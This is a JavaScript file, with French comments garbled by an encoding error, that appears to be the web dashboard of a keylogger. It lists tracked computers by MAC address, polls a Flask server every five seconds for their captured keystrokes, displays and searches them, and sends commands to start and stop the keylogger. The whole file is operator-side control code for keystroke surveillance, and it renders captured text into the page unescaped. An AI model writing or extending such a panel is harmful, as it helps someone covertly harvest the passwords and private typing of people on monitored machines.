let logData = []; // Stocke les frappes r√©cup√©r√©es

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list"); // S√©lecteur des machines
    const logContent = document.getElementById("log-content"); // Contenu des logs affich√©s
    const mainMessage = document.getElementById("main-message"); // Message par d√©faut
    const recordingStatus = document.getElementById("recordingStatus"); // Indicateur d'enregistrement

    // üì• 1Ô∏è‚É£ R√©cup√©rer la liste des machines enregistr√©es
    async function fetchComputers() {
        const response = await fetch('/get_users'); // Requ√™te GET pour obtenir la liste des machines
        const data = await response.json();

        // R√©initialise la liste et ajoute l'option par d√©faut
        computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

        for (const mac in data) {
            const option = document.createElement('option');
            option.value = mac;
            option.textContent = mac;
            computerSelect.appendChild(option);
        }
    }

    // üì• 2Ô∏è‚É£ R√©cup√©rer les frappes enregistr√©es pour la machine s√©lectionn√©e
    async function fetchData() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return;

        const response = await fetch('/get_data');  // Requ√™te GET pour r√©cup√©rer les frappes
        const data = await response.json();

        console.log("Donn√©es r√©cup√©r√©es :", data); // Debug pour voir les logs en console
        logData = data[selectedMac] || [];
        displayContent(logData);
    }

    // üñ•Ô∏è Afficher les logs dans l'interface
    function displayContent(content) {
        logContent.innerHTML = content.map(item => `<p>${item}</p>`).join('');
    }

    // üîé Filtrer les frappes en fonction de la recherche utilisateur
    function searchContent(query) {
        if (!query) return displayContent(logData);
        const filtered = logData.filter(text => text.includes(query));
        displayContent(filtered);
    }

    // üì§ 3Ô∏è‚É£ D√©marrer le keylogger (via Flask)
    async function startKeylogger() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return alert("Please select a computer!");

        await fetch('/start_keylogger', { method: 'POST' }); // Requ√™te POST vers Flask

        // Modifier l'affichage pour montrer que le keylogger est actif
        recordingStatus.style.display = "block";
        mainMessage.style.display = "none";
    }

    // üì§ 4Ô∏è‚É£ Arr√™ter le keylogger (via Flask)
    async function stopKeylogger() {
        await fetch('/stop_keylogger', { method: 'POST' }); // Requ√™te POST vers Flask

        // Modifier l'affichage pour indiquer que l'enregistrement est stopp√©
        recordingStatus.style.display = "none";
        mainMessage.style.display = "block";
    }

    // G√©rer le changement de s√©lection d'un ordinateur
    computerSelect.addEventListener("change", function () {
        if (computerSelect.value) {
            mainMessage.style.display = "none"; // Cache le message principal
            recordingStatus.style.display = "block"; // Affiche "Recording in progress..."
            fetchData(); // R√©cup√®re les donn√©es d√®s qu'un PC est s√©lectionn√©
        }
    });

    // üì° Lancer la r√©cup√©ration des donn√©es toutes les 5 secondes
    fetchComputers(); // R√©cup√©rer la liste des machines d√®s le chargement
    setInterval(fetchData, 5000); // Mettre √† jour les logs toutes les 5 sec
});
